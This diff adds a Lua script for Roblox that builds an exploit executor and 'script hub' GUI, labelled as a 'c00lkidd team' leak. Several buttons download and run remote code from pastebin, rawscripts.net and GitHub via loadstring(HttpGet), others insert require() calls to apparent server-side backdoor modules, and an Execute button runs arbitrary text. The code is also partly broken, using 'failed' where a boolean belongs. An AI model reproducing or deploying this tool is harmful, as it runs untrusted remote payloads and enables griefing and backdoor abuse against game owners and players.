@@ -1,0 +1,468 @@
+local gui = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local UICorner0 = Instance.new("UICorner")
+local Main1 = Instance.new("Frame")
+local UICornerMa = Instance.new("UICorner")
+local Main2 = Instance.new("Frame")
+local UICorner9 = Instance.new("UICorner")
+local TextBox = Instance.new("TextBox")
+local exe = Instance.new("TextButton")
+local UICornerexe = Instance.new("UICorner")
+local exe1 = Instance.new("TextButton")
+local UICornere = Instance.new("UICorner")
+local clea = Instance.new("TextButton")
+local UICornercle = Instance.new("UICorner")
+local clea1 = Instance.new("TextButton")
+local UICorner8 = Instance.new("UICorner")
+local R60 = Instance.new("TextButton")
+local UICorner5 = Instance.new("UICorner")
+local Re2 = Instance.new("TextButton")
+local UICornerr = Instance.new("UICorner")
+local Scrsc = Instance.new("ScrollingFrame")
+local Ui1 = Instance.new("UICorner")
+local op = Instance.new("TextButton")
+local RGB = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local R6 = Instance.new("TextButton")
+local UICorner1 = Instance.new("UICorner")
+local RGB1 = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Vi = Instance.new("Frame")
+
+---Properties:
+
+gui.Name = "Scripts c00lkidd team 4 leak"
+gui.Parent = game.CoreGui
+
+Main.Size = UDim2.new(0, 555, 0, 309)
+Main.Position = UDim2.new(0.2, 25, 0.0, 3)
+Main.BackgroundColor3 = Color3.new(1, 1, 1)
+Main.BorderColor3 = Color3.new(0, 0, 0)
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.BackgroundTransparency = 0 
+Main.Draggable = true
+Main.Parent = gui
+
+UICorner0.CornerRadius = UDim.new(0, 6)
+UICorner0.Parent = Main
+
+Main1.Size = UDim2.new(0.9, 27, 0.8, 2)
+Main1.Position = UDim2.new(0.0, 9, 0.1, 14)
+Main1.BackgroundColor3 = Color3.new(0, 0, 0)
+Main1.BorderColor3 = Color3.new(0, 0, 0)
+Main1.BorderSizePixel = 1
+Main1.Active = failed
+Main1.BackgroundTransparency = 0.8
+Main1.Draggable = true
+Main1.Parent = Main
+
+UICornerMa.CornerRadius = UDim.new(0, 9)
+UICornerMa.Parent = Main1
+
+Main2.Size = UDim2.new(0.9, 27, 0.8, 2)
+Main2.Position = UDim2.new(0.0, 9, 0.1, 14)
+Main2.BackgroundColor3 = Color3.new(0, 0, 0)
+Main2.BorderColor3 = Color3.new(0, 0, 0)
+Main2.BorderSizePixel = 1
+Main2.Active = failed
+Main2.BackgroundTransparency = 0.8
+Main2.Draggable = true
+Main2.Parent = Main
+Main2.Visible = failed
+
+UICorner9.CornerRadius = UDim.new(0, 9)
+UICorner9.Parent = Main2
+
+exe1.Size = UDim2.new(0.2, 19, 0.2, 0)
+exe1.Position = UDim2.new(0.7, 17, 0.0, 4)
+exe1.BackgroundColor3 = Color3.new(1, 1, 1)
+exe1.BorderColor3 = Color3.new(0, 0, 0)
+exe1.BorderSizePixel = 0
+exe1.Text = "Executor"
+exe1.BackgroundTransparency = 0 
+exe1.TextColor3 = Color3.new(0, 0, 0)
+exe1.Font = Enum.Font.Code
+exe1.Parent = Main2
+exe1.TextSize = 15
+exe1.MouseButton1Click:Connect(function()
+Main1.Visible = true
+Main2.Visible = failed
+end)
+
+UICornere.CornerRadius = UDim.new(0, 9)
+UICornere.Parent = exe1
+
+clea1.Size = UDim2.new(0.2, 19, 0.2, 0)
+clea1.Position = UDim2.new(0.7, 17, 0.1, 40)
+clea1.BackgroundColor3 = Color3.new(1, 1, 1)
+clea1.BorderColor3 = Color3.new(0, 0, 0)
+clea1.BorderSizePixel = 0
+clea1.Text = "Script hub"
+clea1.BackgroundTransparency = 0 
+clea1.TextColor3 = Color3.new( 0, 0, 0)
+clea1.Font = Enum.Font.Code
+clea1.Parent = Main2
+clea1.TextSize = 15
+clea1.MouseButton1Click:Connect(function()
+Main2.Visible = true
+Main1.Visible = failed
+end)
+
+UICorner8.CornerRadius = UDim.new(0, 9)
+UICorner8.Parent = clea1
+
+R60.Size = UDim2.new(0.1, 5, 0.2, 0)
+R60.Position = UDim2.new(0.8, 33, 0.7, 13)
+R60.BackgroundColor3 = Color3.new(1, 1, 1)
+R60.BorderColor3 = Color3.new(0, 0, 0)
+R60.BorderSizePixel = 0
+R60.Text = "R6"
+R60.BackgroundTransparency = 0 
+R60.TextColor3 = Color3.new(0, 0, 0)
+R60.Font = Enum.Font.Code
+R60.Parent = Main2
+R60.TextSize = 19
+R60.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/9BFcHqfK"))("Copyright ERROR_CODE ECCS Co")
+end)
+
+UICorner5.CornerRadius = UDim.new(0, 9)
+UICorner5.Parent = R60
+
+Re2.Size = UDim2.new(0.1, 5, 0.2, 0)
+Re2.Position = UDim2.new(0.7, 19, 0.7, 13)
+Re2.BackgroundColor3 = Color3.new(1, 1, 1)
+Re2.BorderColor3 = Color3.new(0, 0, 0)
+Re2.BorderSizePixel = 0
+Re2.Text = "RE"
+Re2.BackgroundTransparency = 0 
+Re2.TextColor3 = Color3.new(0, 0, 0)
+Re2.Font = Enum.Font.Code
+Re2.Parent = Main2
+Re2.TextSize = 19
+Re2.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/ukFZuXbb'),true))()
+end)
+
+UICornerr.CornerRadius = UDim.new(0, 9)
+UICornerr.Parent = Re2
+
+Scrsc.Size = UDim2.new(0.7, 0, 0.9, 10)
+Scrsc.Position = UDim2.new(0.0, 9, 0.0, 4)
+Scrsc.BackgroundColor3 = Color3.new(1, 1, 1)
+Scrsc.BorderColor3 = Color3.new(0, 0, 0)
+Scrsc.BorderSizePixel = 0
+Scrsc.Parent = Main2
+
+Scrsc.BackgroundTransparency = 0 
+
+Ui1.CornerRadius = UDim.new(0, 5)
+Ui1.Parent = Scrsc
+
+TextBox.Size = UDim2.new(0.7, 0, 0.9, 10)
+TextBox.Position = UDim2.new(0.0, 9, 0.0, 4)
+TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
+TextBox.BorderColor3 = Color3.new(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Text = "--put ss script here"
+TextBox.TextColor3 = Color3.new(0, 0, 0)
+TextBox.BackgroundTransparency = 0
+TextBox.Font = Enum.Font.Code
+TextBox.TextSize = 15
+TextBox.Parent = Main1
+TextBox.TextSize = 13
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.ClearTextOnFocus = failed
+TextBox.MultiLine = true
+
+op.Size = UDim2.new(0.9, 10, 0.1, 13)
+op.Position = UDim2.new(0.0, 7, 0.0, 0)
+op.BackgroundColor3 = Color3.new(1, 1, 1)
+op.BorderColor3 = Color3.new(0, 0, 0)
+op.BorderSizePixel = 0
+op.Text = "Scatman's world"
+op.BackgroundTransparency = 0 
+op.TextColor3 = Color3.new(0, 0, 0)
+op.Font = Enum.Font.Code
+op.Parent = Scrsc
+op.TextSize = 25
+op.MouseButton1Click:Connect(function()
+TextBox.Text = "require(6305379088).Scatman('"..game.Players.LocalPlayer.Name.."')"
+end)
+
+local oo = Instance.new("TextButton")
+oo.Size = UDim2.new(0.9, 10, 0.1, 13)
+oo.Position = UDim2.new(0.0, 7, 0.2, 0)
+oo.BackgroundColor3 = Color3.new(255, 0, 0)
+oo.BorderColor3 = Color3.new(255, 0, 0)
+oo.BorderSizePixel = 0
+oo.Text = "John doe hub V2.3"
+oo.BackgroundTransparency = 0 
+oo.TextColor3 = Color3.new(0, 0, 0)
+oo.Font = Enum.Font.Code
+oo.Parent = Scrsc
+oo.TextSize = 25
+oo.MouseButton1Click:Connect(function()
+TextBox.Text = "require(6305379088).v3('"..game.Players.LocalPlayer.Name.."')"
+end)
+
+local ol = Instance.new("TextButton")
+ol.Size = UDim2.new(0.9, 10, 0.1, 13)
+ol.Position = UDim2.new(0.0, 7, 0.4, 0)
+ol.BackgroundColor3 = Color3.new(255, 0, 0)
+ol.BorderColor3 = Color3.new(255, 0, 0)
+ol.BorderSizePixel = 0
+ol.Text = "Lightning Cannon UTG"
+ol.BackgroundTransparency = 0 
+ol.TextColor3 = Color3.new(0, 0, 0)
+ol.Font = Enum.Font.Code
+ol.Parent = Scrsc
+ol.TextSize = 25
+ol.MouseButton1Click:Connect(function()
+TextBox.Text = "require(6305379088).v4('"..game.Players.LocalPlayer.Name.."')"
+end)
+
+local sxs = Instance.new("TextButton")
+sxs.Size = UDim2.new(0.9, 10, 0.1, 13)
+sxs.Position = UDim2.new(0.0, 7, 0.999999, 0)
+sxs.BackgroundColor3 = Color3.new(255, 0, 0)
+sxs.BorderColor3 = Color3.new(255, 0, 0)
+sxs.BorderSizePixel = 0
+sxs.Text = "tool giver"
+sxs.BackgroundTransparency = 0 
+sxs.TextColor3 = Color3.new(0, 0, 0)
+sxs.Font = Enum.Font.Code
+sxs.Parent = Scrsc
+sxs.TextSize = 25
+sxs.MouseButton1Click:Connect(function()
+TextBox.Text = 'require(6305379088).tool("'..game.Players.LocalPlayer.Name..'")'
+loadstring(game:HttpGet("https://pastebin.com/raw/3XPaYv08"))()
+end)
+
+local xx = Instance.new("TextButton")
+xx.Size = UDim2.new(0.9, 10, 0.1, 13)
+xx.Position = UDim2.new(0.0, 7, 0.8, 0)
+xx.BackgroundColor3 = Color3.new(255, 0, 0)
+xx.BorderColor3 = Color3.new(255, 0, 0)
+xx.BorderSizePixel = 0
+xx.Text = "John doe"
+xx.BackgroundTransparency = 0 
+xx.TextColor3 = Color3.new(0, 0, 0)
+xx.Font = Enum.Font.Code
+xx.Parent = Scrsc
+xx.TextSize = 25
+xx.MouseButton1Click:Connect(function()
+TextBox.Text = 'require(6305379088).jd("'..game.Players.LocalPlayer.Name..'")'
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-John-doe-script-by-g00byd0lan-10381"))()
+end)
+
+local pop = Instance.new("TextButton")
+pop.Size = UDim2.new(0.9, 10, 0.1, 13)
+pop.Position = UDim2.new(0.0, 7, 0.6, 0)
+pop.BackgroundColor3 = Color3.new(255, 0, 0)
+pop.BorderColor3 = Color3.new(255, 0, 0)
+pop.BorderSizePixel = 0
+pop.Text = "Mr bean's admin"
+pop.BackgroundTransparency = 0 
+pop.TextColor3 = Color3.new(0, 0, 0)
+pop.Font = Enum.Font.Code
+pop.Parent = Scrsc
+pop.TextSize = 25
+pop.MouseButton1Click:Connect(function()
+TextBox.Text = 'require(15232587754).admin("'..game.Players.LocalPlayer.Name..'")'
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Test4267/mrbean/refs/heads/main/hh"))()
+end)
+
+local Ui = Instance.new("UICorner")
+Ui.CornerRadius = UDim.new(0, 5)
+Ui.Parent = op
+
+RGB.Size = UDim2.new(0.9, 56, 0.1, 5)
+RGB.Position = UDim2.new(0.0, 0, 0.0, 0)
+RGB.BackgroundColor3 = Color3.new(1, 1, 1)
+RGB.BorderColor3 = Color3.new(0, 0, 0)
+RGB.BorderSizePixel = 0
+RGB.Active = failed
+RGB.BackgroundTransparency = 0 
+RGB.Draggable = true
+RGB.Parent = Main
+
+exe.Size = UDim2.new(0.2, 19, 0.2, 0)
+exe.Position = UDim2.new(0.7, 17, 0.0, 4)
+exe.BackgroundColor3 = Color3.new(1, 1, 1)
+exe.BorderColor3 = Color3.new(0, 0, 0)
+exe.BorderSizePixel = 0
+exe.Text = "Execute"
+exe.BackgroundTransparency = 0 
+exe.TextColor3 = Color3.new(0, 0, 0)
+exe.Font = Enum.Font.Code
+exe.Parent = Main1
+exe.TextSize = 15
+exe.MouseButton1Click:Connect(function()
+loadstring(script.Parent.Parent.TextBox.Text)()
+end)
+
+UICornerexe.CornerRadius = UDim.new(0, 9)
+UICornerexe.Parent = exe
+
+clea.Size = UDim2.new(0.2, 19, 0.2, 0)
+clea.Position = UDim2.new(0.7, 17, 0.1, 40)
+clea.BackgroundColor3 = Color3.new(1, 1, 1)
+clea.BorderColor3 = Color3.new(0, 0, 0)
+clea.BorderSizePixel = 0
+clea.Text = "Script hub"
+clea.BackgroundTransparency = 0 
+clea.TextColor3 = Color3.new( 0, 0, 0)
+clea.Font = Enum.Font.Code
+clea.Parent = Main1
+clea.TextSize = 15
+clea.MouseButton1Click:Connect(function()
+Main1.Visible = failed
+exe.Visible = true
+Main2.Visible = true
+end)
+
+UICornercle.CornerRadius = UDim.new(0, 9)
+UICornercle.Parent = clea
+
+local Re1 = Instance.new("TextButton")
+Re1.Size = UDim2.new(0.1, 5, 0.2, 0)
+Re1.Position = UDim2.new(0.7, 19, 0.7, 13)
+Re1.BackgroundColor3 = Color3.new(1, 1, 1)
+Re1.BorderColor3 = Color3.new(0, 0, 0)
+Re1.BorderSizePixel = 0
+Re1.Text = "RE"
+Re1.BackgroundTransparency = 0 
+Re1.TextColor3 = Color3.new(0, 0, 0)
+Re1.Font = Enum.Font.Code
+Re1.Parent = Main1
+Re1.TextSize = 19
+Re1.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/ukFZuXbb'),true))()
+end)
+
+R6.Size = UDim2.new(0.1, 5, 0.2, 0)
+R6.Position = UDim2.new(0.8, 33, 0.7, 13)
+R6.BackgroundColor3 = Color3.new(1, 1, 1)
+R6.BorderColor3 = Color3.new(0, 0, 0)
+R6.BorderSizePixel = 0
+R6.Text = "R6"
+R6.BackgroundTransparency = 0 
+R6.TextColor3 = Color3.new(0, 0, 0)
+R6.Font = Enum.Font.Code
+R6.Parent = Main1
+R6.TextSize = 19
+R6.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/jHGVauVX'),true))()
+end)
+
+RGB1.Size = UDim2.new(0.5, 0, 0.2, 0)
+RGB1.Position = UDim2.new(0.5, 0, 0.5, 0)
+RGB1.BackgroundColor3 = Color3.new(1, 1, 1)
+RGB1.BorderColor3 = Color3.new(0, 0, 0)
+RGB1.BorderSizePixel = 1
+RGB1.Active = failed
+RGB1.BackgroundTransparency = 1
+RGB1.Draggable = true
+RGB1.Parent = RGB
+
+local RGB2 = Instance.new("TextButton")
+
+
+UICorner.CornerRadius = UDim.new(0, 9)
+UICorner.Parent = Re1
+
+UICorner1.CornerRadius = UDim.new(0, 9)
+UICorner1.Parent = R6
+
+Vi.Size = UDim2.new(0.5, 0, 0.4, 0)
+Vi.Position = UDim2.new(0.5, 0, 0.5, 0)
+Vi.BackgroundColor3 = Color3.new(1, 1, 1)
+Vi.BorderColor3 = Color3.new(0, 0, 0)
+Vi.BorderSizePixel = 0
+Vi.Active = failed
+Vi.BackgroundTransparency = 1
+Vi.Draggable = true
+Vi.Parent = op
+
+local gg = Instance.new("TextButton")
+gg.Size = UDim2.new(0.5, 0, 0.4, 0)
+gg.Position = UDim2.new(0.5, 0, 0.5, 0)
+gg.BackgroundColor3 = Color3.new(1, 1, 1)
+gg.BorderColor3 = Color3.new(0, 0, 0)
+gg.BorderSizePixel = 0
+gg.Active = failed
+gg.BackgroundTransparency = 1
+gg.Draggable = true
+gg.Parent = ol
+
+local ss = Instance.new("TextButton")
+ss.Size = UDim2.new(0.5, 0, 0.4, 0)
+ss.Position = UDim2.new(0.5, 0, 0.5, 0)
+ss.BackgroundColor3 = Color3.new(1, 1, 1)
+ss.BorderColor3 = Color3.new(0, 0, 0)
+ss.BorderSizePixel = 0
+ss.Active = failed
+ss.BackgroundTransparency = 1
+ss.Draggable = true
+ss.Parent = oo
+
+local kk = Instance.new("TextButton")
+kk.Size = UDim2.new(0.5, 0, 0.4, 0)
+kk.Position = UDim2.new(0.5, 0, 0.5, 0)
+kk.BackgroundColor3 = Color3.new(1, 1, 1)
+kk.BorderColor3 = Color3.new(0, 0, 0)
+kk.BorderSizePixel = 0
+kk.Active = failed
+kk.BackgroundTransparency = 1
+kk.Draggable = true
+kk.Parent = pop
+
+local pp = Instance.new("TextButton")
+pp.Size = UDim2.new(0.5, 0, 0.4, 0)
+pp.Position = UDim2.new(0.5, 0, 0.5, 0)
+pp.BackgroundColor3 = Color3.new(1, 1, 1)
+pp.BorderColor3 = Color3.new(0, 0, 0)
+pp.BorderSizePixel = 0
+pp.Active = failed
+pp.BackgroundTransparency = 1
+pp.Draggable = true
+pp.Parent = sxs
+
+local HH = Instance.new("TextButton")
+HH.Size = UDim2.new(0.5, 0, 0.4, 0)
+HH.Position = UDim2.new(0.5, 0, 0.5, 0)
+HH.BackgroundColor3 = Color3.new(1, 1, 1)
+HH.BorderColor3 = Color3.new(0, 0, 0)
+HH.BorderSizePixel = 0
+HH.Active = failed
+HH.BackgroundTransparency = 1
+HH.Draggable = true
+HH.Parent = xx
+
+---Scripts:
+
+function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
+
+counter = 0
+
+while wait(0.1)do
+RGB1.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
+
+ counter = counter + 0.0099 
+
+Vi.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
+
+gg.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
+
+ss.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
+
+HH.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
+
+pp.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
+
+kk.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
+
+end
